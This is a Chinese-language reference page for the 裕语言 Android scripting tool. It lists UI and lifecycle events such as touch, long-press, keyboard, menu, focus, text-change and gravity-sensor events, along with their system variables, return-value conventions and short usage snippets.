<p>系统赋值：<br>st_vId：控件id<br>st_vW：控件对象<br>st_eA：执行的动作<br>st_eX：触屏位置X坐标<br>st_eY：触屏位置Y坐标<br>st_rX：原始位置X坐标<br>st_rY：原始位置Y坐标</p>
<p>说明：<br>该事件有返回值，不设置返回值将默认为false。当用户触屏屏幕即执行事件代码。</p>
<p>返回值说明：<br>在事件代码编辑框顶部一行填写 “[true]”，即设置为返回true<br>当返回true值时，说明已完成该事件的执行，将不在执行此事件。<br>当返回false值时，将持续执行当前事件。</p>
<p>【触屏长按事件】<br>用法：<br>[true]<br>tw(“将返回值为true”)</p>
<p>系统赋值：<br>st_vId：控件id<br>st_vW：控件对象</p>
<p>说明：<br>该事件有返回值，不设置返回值将默认为false。当用户长久触屏屏幕即执行事件代码。</p>
<p>返回值说明：<br>在事件代码编辑框顶部一行填写 “[true]”，即设置为返回true<br>当返回true值时，说明已完成该事件的执行，将不在执行此事件。<br>当返回false值时，将持续执行当前事件。</p>
<p>【键盘触发事件】<br>用法：<br>[true]<br>tw(“将返回值为true”)</p>
<p>系统赋值：<br>st_vId：控件id<br>st_vW：控件对象<br>st_kC：按下的物理按键对应的数值<br>st_eA：执行的动作<br>st_eR：</p>
<p>说明：<br>该事件有返回值，不设置返回值将默认为false。当用户按下物理按键即执行事件代码。</p>
<p>返回值说明：<br>在事件代码编辑框顶部一行填写 “[true]”，即设置为返回true<br>当返回true值时，说明已完成该事件的执行，将不在执行此事件。<br>当返回false值时，将持续执行当前事件。</p>
<p>【触屏长按菜单事件】<br>用法：<br>title:操作<br>case 选择A:<br>tw(“A”)<br>break<br>case 选择B:<br>tw(“B”)<br>break<br>case 选择C:<br>tw(“C”)<br>break<br>default:<br>tw(“载入成功”)<br>break</p>
<p>系统赋值：<br>st_vId：控件id<br>st_vW：控件对象</p>
<p>说明：<br>常用于需要多操作选项。</p>
<p>【框编辑监听事件】<br>用法：<br>[true]<br>tw(“将返回值为true”)</p>
<p>系统赋值：<br>st_vId：控件id<br>st_vW：控件对象<br>st_aI：动作的标识数值<br>st_eA：执行的动作<br>st_eR：<br>st_eK：键值</p>
<p>说明：<br>该事件有返回值，不设置返回值将默认为false。当用户按下动作键即执行事件代码。</p>
<p>注意：<br>需要编辑框设置相应的控件 imeoptions 属性</p>
<p>事件例子：<br>f(st_aI != 0)<br>{<br>//动作的标识数值<br>syso(st_aI)<br>}</p>
<p>返回值说明：<br>在事件代码编辑框顶部一行填写 “[true]”，即设置为返回true<br>当返回true值时，说明已完成该事件的执行，将不在执行此事件。<br>当返回false值时，将持续执行当前事件。</p>
<p>【文本更新监听事件】</p>
<p>系统赋值：<br>st_vId：控件id<br>st_vW：控件对象<br>st_sS：文本内容<br>st_sT：<br>st_bE：<br>st_cT：<br>st_aR：</p>
<p>说明：<br>该事件无返回值。常用于监听文本即时更新。</p>
<p>【获得焦点事件】</p>
<p>系统赋值：<br>st_vId：控件id<br>st_vW：控件对象<br>st_hF：是否获得焦点</p>
<p>说明：<br>该事件无返回值，当控件获得/失去焦点即执行事件代码。</p>
<p>【触屏滑动事件】</p>
<p>系统赋值：<br>st_vId：控件id<br>st_vW：控件对象<br>st_sE：<br>st_fM：<br>st_vT：<br>st_bT：</p>
<p>说明：<br>常用于滑动控件的滑动监听。</p>
<p>【单击项目事件】</p>
<p>系统赋值：<br>st_vId：控件id<br>st_vW：控件对象<br>st_pN：被点击视图中的位置<br>st_iD：被点击的项目</p>
<p>说明：<br>常用于列表项点击监听。</p>
<p>【浏览器事件】</p>
<p>说明：<br>常用于浏览器的互动。</p>
<p>【滑动窗体事件】</p>
<p>说明：<br>常用于滑动窗体的互动。</p>
<p>【侧滑窗体事件】</p>
<p>说明：<br>常用于侧滑窗体的互动。</p>
<p>【下拉菜单事件】</p>
<p>说明：<br>常用于下拉菜单的互动。</p>
<p>【摄像头拍摄事件】</p>
<p>说明：<br>常用于摄像头拍摄事件的互动。</p>
<p>【载入事件】</p>
<p>说明：<br>将于界面加载完毕后执行。</p>
<p>【载入完毕事件（界面可交互）】</p>
<p>说明：<br>将于界面加载完毕后，并且用户可于界面交互时执行。常用需要在载入事件中设置控件属性。</p>
<p>如：<br>使用 addv 添加将界面后，如果设置控件属性，请将设置属性的代码写入 载入完毕事件中。</p>
<p>【菜单事件】<br>用法：<br>case 选择A:<br>tw(“A”)<br>break<br>case 选择B:<br>tw(“B”)<br>break<br>case 选择C:<br>tw(“C”)<br>break<br>default:<br>tw(“载入成功”)<br>break</p>
<p>//参数为多个并以“|”隔开<br>//参数1为选项标题|参数2为图标|参数3为显示动作值分别为0 1 2 4 8|参数4为次序根据数值大小<br>带图标的<br>case 选择A|@a.png|1|1:<br>tw(“A”)<br>break<br>case 选择B|@b.png|0|2:<br>tw(“B”)<br>break<br>case 选择C|@c.png|0|3:<br>tw(“C”)<br>break<br>default:<br>tw(“载入成功”)<br>break</p>
<p>说明：<br>当用户触屏菜单事件。</p>
<p>【按键按下事件】</p>
<p>说明：<br>用户设备物理按键按下将执行。</p>
<p>【按键释放事件】</p>
<p>说明：<br>用户设备物理按键按下然后释放触屏，将执行。</p>
<p>【销毁界面事件】</p>
<p>说明：<br>当用户销毁当前界面时将执行。</p>
<p>【停止事件】</p>
<p>说明:<br>界面处于停止或暂停事将执行。（如：用户切出到其他应用）</p>
<p>【重新开始事件】</p>
<p>说明：<br>界面重新获得焦点，可视时将执行。（如：用户从其他应用切换回来了）</p>
<p>【回调结果事件】</p>
<p>系统赋值：<br>st_sC：请求标识数值<br>st_lC：结果状态数值<br>st_iT：结果目标对象</p>
<p>说明：<br>常用于界面或功能回调返回的结果或传递的数据。</p>
<p>【重力感应事件】</p>
<p>系统赋值：<br>st_x：X轴<br>st_y：Y轴<br>st_z：Z轴</p>
<p>说明：<br>获取手机的即时动作。</p>
<p>参考：<br>　　手机屏幕向上(z轴朝天)水平放置的时侯，(x，y，z)的值分别为(0，0，10);<br>　　手机屏幕向下(z轴朝地)水平放置的时侯，(x，y，z)的值分别为(0，0，-10);<br>　　手机屏幕向左侧放(x轴朝天)的时候，(x，y，z)的值分别为(10，0，0);<br>　　手机竖直(y轴朝天)向上的时候，(x，y，z)的值分别为(0，10，0);</p>
]]></content>
      <categories>
        <category>编程</category>
        <category>裕语言</category>
      </categories>
      <tags>
        <tag>编程</tag>
      </tags>
  </entry>
</search>
